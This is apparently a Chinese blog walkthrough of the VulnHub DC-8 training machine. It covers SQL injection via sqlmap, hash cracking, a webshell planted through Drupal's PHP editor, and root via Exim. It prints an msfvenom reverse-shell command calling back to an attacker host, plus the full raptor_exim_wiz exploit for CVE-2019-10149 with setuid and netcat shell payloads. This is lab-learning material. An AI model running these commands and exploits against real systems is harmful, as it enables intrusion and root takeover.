@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-DC_8-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-DC_8-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 9, 2020&nbsp;&nbsp;8:06:02</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=528306&auto=1&height=66"></iframe>
+
+<h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>DC-8是另一个专门构建的易受攻击的实验室，目的是在渗透测试领域积累经验。</p>
+<p>这个挑战有点复杂，既是实际挑战，又是关于在Linux上安装和配置的两因素身份验证是否可以阻止Linux服务器被利用的“概念证明”。</p>
+<p>由于在Twitter上询问了有关双重身份验证和Linux的问题，也由于@ theart42的建议，最终导致了该挑战的“概念验证”部分。</p>
+<p>这项挑战的最终目标是绕过两因素身份验证，获得root权限并读取唯一的标志。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a></p>
+<h2 id="运用的知识点"><a href="#运用的知识点" class="headerlink" title="运用的知识点"></a>运用的知识点</h2><p><code>Drupal 7</code> SQL注入<br><code>john</code>破解<code>HASH</code><br><code>Drupal 7</code> 后台编辑页面 <code>Getshell</code><br><code>exim</code>SUID本地提权</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机先对它的 <code>IP</code> 进行端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.147</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1297.png" alt="图片"></p>
+<p>由上图可见，它开放了 <code>22</code>（ssh）、<code>80</code>（http）两个服务端口，而 <code>NMAP</code> 帮我们检测出靶机的 <code>CMS</code> 是 <code>Drupal 7</code>！我寻思<code>DC</code>系列的靶机都是这个<code>CMS</code>？不废话，我们先来看看它的<code>web</code>页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.147/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1298.png" alt="图片"></p>
+<h2 id="Drupal-7-SQL注入"><a href="#Drupal-7-SQL注入" class="headerlink" title="Drupal 7 SQL注入"></a>Drupal 7 SQL注入</h2><p>经过在页面上的侦查，我发现有三个页面引起了我的注意：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1299.png" alt="图片"></p>
+<p>他们的参数是 <code>http://192.168.1.147/?nid=1</code> ，看上去像是一个<code>SQL注入</code>点，于是我手工判断是否存在注入，<code>nid=2-1</code>，结果它返回了<code>nid=1</code> 的页面，说明它存在注入！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1300.png" alt="图片"></p>
+<p>随后掏出我的<code>SQLMAP</code>神器上去就是一顿梭哈获取到了管理员的账号和加密的<code>HASH</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 192.168.1.147/?nid=2 -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: d7db                                                                                                                                                                                              </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1301.png" alt="图片"></p>
+<h2 id="john破解HASH"><a href="#john破解HASH" class="headerlink" title="john破解HASH"></a>john破解HASH</h2><p>紧接着我用 <code>KALI</code> 自带的 <code>john</code> 开膛手杰克对他们两个密码一一破解！破解 <code>admin</code> 的 <code>HASH</code> 破解不出来：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1302.png" alt="图片"></p>
+<p>破解 <code>john</code> 的密码为 <code>turtle</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1303.png" alt="图片"></p>
+<p>获取到 <code>john</code> 的密码后我用它的密码登陆到了网站后台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.147/user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1304.png" alt="图片"></p>
+<h2 id="Drupal-7-后台编辑页面-Getshell"><a href="#Drupal-7-后台编辑页面-Getshell" class="headerlink" title="Drupal 7 后台编辑页面 Getshell"></a>Drupal 7 后台编辑页面 Getshell</h2><p>登陆到网站的后台后我们需要获取到<code>webshell</code>！我在网站的 <code>Webform</code> 找到了可以编辑 <code>PHP</code> 的页面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1305.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1306.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1307.png" alt="图片"></p>
+<p>这个和 <code>DC-7</code> 靶机有点类似，都是通过后台编辑 <code>PHP</code> 页面来获取到 <code>webshell</code>！我首先是用 <code>MSF</code> 生成了一段 <code>payload</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.128 lport=9999 -f raw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1308.png" alt="图片"></p>
+<p>然后开启 <code>MSF</code> 监听模式：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1309.png" alt="图片"></p>
+<p>最后把刚刚 <code>MSF</code> 生成的 <code>Payload</code> 放到网站的 <code>PHP</code> 编辑页面里：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1310.png" alt="图片"></p>
+<p>保存后来到网站的 <code>Contact Us</code> 提交页面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1311.png" alt="图片"></p>
+<p>这个时候 <code>Metasploit</code> 就成功反弹得到了一枚 <code>shell</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1312.png" alt="图片"></p>
+<p>先让它切换到 <code>shell</code> 环境 然后使用 <code>Python</code> 得到一个 <code>bash</code> shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1313.png" alt="图片"></p>
+<p>获取到 <code>shell</code> 之后，我切换到 <code>/home</code> 目录发现只有一个用户 <code>dc8user</code>，但是它里面没有什么文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1314.png" alt="图片"></p>
+<h2 id="exim本地提权获取Flag"><a href="#exim本地提权获取Flag" class="headerlink" title="exim本地提权获取Flag"></a>exim本地提权获取Flag</h2><p>随后我使用 <code>find</code> 命令来查找具有 <code>SUID</code> 权限的文件命令发现了一个 <code>exim4</code>：</p>
+<p>（PS：<code>Exim</code>是一个MTA（Mail Transfer Agent，<code>邮件传输代理</code>）服务器软件，该软件基于GPL协议开发，是一款开源软件。 该软件主要运行于类UNIX系统。）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1315.png" alt="图片"></p>
+<p>然后我又看了看 <code>exim</code> 的版本发现它的版本是 <code>4.8.9</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim --version</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1316.png" alt="图片"></p>
+<p>得到了软件的版本信息那么我们就可以去到 <code>exploit-db</code> 上去搜索有关于这个软件版本的相关漏洞：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1317.png" alt="图片"></p>
+<p>由上图可见，它由两个 <code>POC</code>，一个是基于 <code>Metasploit</code> 的，一个是其他的！在 <code>OSCP</code> 考试中 <code>Metasploit</code> 只能使用一次，所以说我们不到万不得已尽量就不要使用 <code>Metasploit</code>！这是关于它的介绍和 <code>EXP</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span></span><br><span class="line"><span class="comment"># Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A flaw was found in Exim versions 4.87 to 4.91 (inclusive). </span></span><br><span class="line"><span class="comment"># Improper validation of recipient address in deliver_message() </span></span><br><span class="line"><span class="comment"># function in /src/deliver.c may lead to remote command execution.</span></span><br><span class="line"><span class="comment"># (CVE-2019-10149)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a local privilege escalation exploit for &quot;The Return </span></span><br><span class="line"><span class="comment"># of the WIZard&quot; vulnerability reported by the Qualys Security </span></span><br><span class="line"><span class="comment"># Advisory team.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment"># Qualys Security Advisory team (kudos for your amazing research!)</span></span><br><span class="line"><span class="comment"># Dennis &#x27;dhn&#x27; Herrmann (/dev/tcp technique)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (setuid method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m setuid</span></span><br><span class="line"><span class="comment"># Preparing setuid shell helper...</span></span><br><span class="line"><span class="comment"># Delivering setuid payload...</span></span><br><span class="line"><span class="comment"># [...]</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span></span><br><span class="line"><span class="comment"># # id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (netcat method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m netcat</span></span><br><span class="line"><span class="comment"># Delivering netcat payload...</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># localhost [127.0.0.1] 31337 (?) open</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Vulnerable platforms:</span></span><br><span class="line"><span class="comment"># Exim 4.87 - 4.91</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Tested against:</span></span><br><span class="line"><span class="comment"># Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">METHOD=<span class="string">&quot;setuid&quot;</span> <span class="comment"># default method</span></span><br><span class="line">PAYLOAD_SETUID=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line">PAYLOAD_NETCAT=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># usage instructions</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">usage</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$0</span> [-m METHOD]&quot;</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;-m setuid : use the setuid payload (default)&quot;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;-m netcat : use the netcat payload&quot;</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload delivery</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># connect to localhost:25</span></span><br><span class="line">	<span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/localhost/25</span><br><span class="line"></span><br><span class="line">	<span class="comment"># deliver the payload</span></span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;helo localhost&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;mail from:&lt;&gt;&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;rcpt to:&lt;<span class="variable">$PAYLOAD</span>&gt;&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;data&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..31&#125;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;Received: <span class="variable">$i</span>&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;.&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;quit&quot;</span> &gt;&amp;3</span><br><span class="line">	<span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># print banner</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse command line</span></span><br><span class="line"><span class="keyword">while</span> [ ! -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">		-m) <span class="built_in">shift</span>; METHOD=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span>;;</span><br><span class="line">		* ) usage</span><br><span class="line">		;;</span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$METHOD</span> ]; <span class="keyword">then</span></span><br><span class="line">	usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid method</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;setuid&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># prepare a setuid shell helper to circumvent bash checks</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Preparing setuid shell helper...&quot;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;main()&#123;setuid(0);setgid(0);system(\&quot;/bin/sh\&quot;);&#125;&quot;</span> &gt;/tmp/pwned.c</span><br><span class="line">	gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null</span><br><span class="line">	<span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;Problems compiling setuid shell helper, check your gcc.&quot;</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;Falling back to the /bin/sh method.&quot;</span></span><br><span class="line">		cp /bin/sh /tmp/pwned</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># select and deliver the payload</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">	PAYLOAD=<span class="variable">$PAYLOAD_SETUID</span></span><br><span class="line">	exploit</span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">	sleep 5</span><br><span class="line">	ls -l /tmp/pwned</span><br><span class="line">	/tmp/pwned</span><br><span class="line"></span><br><span class="line"><span class="comment"># netcat method</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;netcat&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># select and deliver the payload</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">	PAYLOAD=<span class="variable">$PAYLOAD_NETCAT</span></span><br><span class="line">	exploit</span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">	sleep 5</span><br><span class="line">	nc -v 127.0.0.1 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># print help</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	usage</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1318.png" alt="图片"></p>
+<p>然后我吧 <code>exp</code> 复制到了 <code>root.sh</code> 里，当然你也可以吧这个 <code>exp</code> 下载到本地，再由本地上传到靶机服务器里，但是我嫌它麻烦，我直接 <code>vi</code> 编辑进去就可以了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1319.png" alt="图片"></p>
+<p>一切就绪之后先给它一个可执行的权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 root.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1320.png" alt="图片"></p>
+<p>按照脚本的提示运行 <code>root.sh</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./root.sh -m netcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1321.png" alt="图片"></p>
+<p>然后 KALI 监听 <code>4444</code> 端口获取到一枚 <code>root</code> 权限的 shell：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1322.png" alt="图片"></p>
+<p>最终也是在 <code>/root</code> 目录下获取到了 <code>Flag</code>！</p>
